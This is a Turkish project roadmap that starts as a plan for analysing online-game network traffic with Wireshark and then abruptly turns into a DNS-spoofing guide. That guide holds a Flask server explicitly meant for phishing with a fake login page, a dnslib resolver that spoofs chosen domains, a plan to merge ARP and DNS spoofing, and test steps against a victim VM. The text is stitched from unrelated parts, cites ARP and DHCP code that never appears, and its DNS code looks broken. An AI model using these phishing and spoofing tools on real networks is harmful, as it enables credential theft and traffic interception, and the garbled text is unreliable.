# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme

## 1. Giriş
Bu proje, Counter-Strike: Global Offensive (CS:GO), Valorant ve PlayerUnknown's Battlegrounds (PUBG) gibi popüler çevrimiçi oyunların ağ bağlantılarını derinlemesine incelemeyi hedeflemektedir. Ana amaç, bu oyunlar sırasında kullanılan IP adreslerini, sunucuları, portları ve protokolleri tespit etmektir. Elde edilen veriler, oyun güvenliği araştırmaları, ağ performans analizi ve potansiyel zafiyet tespiti için temel oluşturacaktır.**

Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.

## 2. Proje Vizyonu
** Projenin temel vizyonu, oyun ağ trafiği analizinde kapsamlı ve tekrarlanabilir bir metodoloji sunarak, araştırmacılar, güvenlik uzmanları ve oyun meraklıları için değerli bir kaynak olmaktır. Uzun vadede, bu projenin statik bir raporlama aracından, dinamik ve etkileşimli bir ağ analiz platformuna dönüşmesi hedeflenmektedir. Bu, sadece mevcut oyunları değil, gelecekteki çevrimiçi oyunları da analiz etmeye olanak tanıyan genişletilebilir bir yapıya sahip olacaktır. **

## 3. Tamamlanan Kilometre Taşı: V1.0 - Temel Ağ Analizi ve Raporlama
Bu aşama, projenin başlangıç hedeflerinin başarıyla tamamlandığı ilk temel sürümü temsil etmektedir.
  **Hedefler:**:
   - Seçilen popüler çevrimiçi oyunların (CS:GO, Valorant, PUBG) temel ağ bağlantı detaylarının (IP adresleri, portlar, kullanılan protokoller) tespiti ve belgelenmesi.
   - Bulguların README.md dosyasında açık ve anlaşılır bir şekilde sunulması.

### Tamamlanan Görevler:
  - Her bir hedef oyun için standart oyun senaryolarında (lobi, oyun içi, sunucu bağlantısı) Wireshark ile ağ trafiği yakalama süreçlerinin tanımlanması ve uygulanması.
  - Oyun trafiğini etkili bir şekilde izole etmek ve analiz etmek için özel Wireshark Capture Filters ve Display Filters setlerinin oluşturulması ve test edilmesi.
  - Yakalanan **.pcap** dosyaları üzerinde temel analizlerin yapılması ve kritik IP adresleri, port aralıkları ve ağ protokollerinin (UDP, TCP) belirlenmes
  - Projenin amacını, hedeflerini, kurulum adımlarını ve ilk bulguları içeren kapsamlı bir README.md dosyasının hazırlanması.
  - Tespit edilen IP/port/protokol bilgilerini özetleyen detaylı bir **Oyun Ağ Bağlantıları Analiz Tablosu**nun oluşturulması ve README.md'ye entegrasyonu.
  - İlgili araştırma notları için researchs/ klasörü altında ilk taslak Markdown dosyalarının oluşturulması (örn. csgo_network_analysis.md, wireshark_filters.md).
### Elde Edilen Çıktılar::
```
Temel oyun ağ bağlantı bilgilerini içeren ilk analiz raporu ve dokümantasyon.

Etkili ve çalışır durumda Wireshark yakalama/görüntüleme filtre setleri.

GitHub üzerinde, kolayca klonlanabilir ve anlaşılır bir yapıya sahip proje deposu.

```

## 4. Gelecek Kilometre Taşları
Projenin uzun vadeli potansiyelini gerçekleştirmek için planlanan gelecek aşamalar ve özellikler aşağıda listelenmiştir. 
Her bir aşama, projenin kabiliyetlerini ve değerini artırmayı hedeflemektedir.

### 4.1. V1.1 - Otomatik Veri İşleme ve Görselleştirme (Kısa Vadeli Hedef)
Bu aşama, manuel analiz süreçlerini otomatize etmeyi ve elde edilen ağ verilerini daha anlaşılır, 
görsel formatlarda sunmayı amaçlamaktadır.

### Hedefler:
   - Otomatik Pcap Analizi: Yakalanan .pcap dosyalarını Python kullanarak (örn. scapy, pyshark) otomatik olarak ayrıştıracak ve işleyecek scriptler geliştirmek.
   - Belirli portlardan geçen toplam paket sayısı ve veri hacmi istatistikleri.
   - En sık iletişim kurulan kaynak/hedef IP adresleri ve bunların bant genişliği kullanımları.
   - Paket boyutu dağılımlarının ve akış sürelerinin analizi.

### Veri Görselleştirme Modülü:
Analiz edilen verileri (trafik yoğunluğu, en aktif sunucular, port kullanım dağılımları vb.) dinamik ve statik grafikler (çubuk grafikler, pasta grafikleri, çizgi grafikler, ısı haritaları) aracılığıyla görselleştirmek için Python kütüphaneleri (matplotlib, seaborn, plotly) kullanmak.


### Sahte Web Sunucusu
Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.

1. Flask’ı kurun: `pip install flask`
2. Basit bir Flask uygulaması yazın:

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('fake_login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).

## Gelişmiş Geliştirmeler

### Seçmeli DNS Spoofing için DNS Proxy
DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.

1. dnslib’i kurun: `pip install dnslib`
2. DNS proxy betiği:

```python
from dnslib import *
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import dns.resolv

class SpoofResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        if qname in ['example.com.']:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
        else:
            # Gerçek DNS’e yönlendirme
            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
        return reply

resolver = SpoofResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()
```

### Entegre MITM Betiği
Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.

1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.

## Geliştirmelerin Test Edilmesi
1. **ARP Spoofing**:
   - Betiği çalıştırın.
   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
2. **DNS Spoofing**:
   - Betiği çalıştırın.
   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
3. **DHCP Manipülasyonu**:
   - Betiği çalıştırın.
   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
4. **Sahte Web Sunucusu**:
   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.

## Karşı Önlemler ve En İyi Uygulamalar
- **Statik ARP Girişleri**: ARP spoofing’i önler.
- **DNSSEC**: DNS sorgularını doğrular.
- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.

## Sonuç
Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
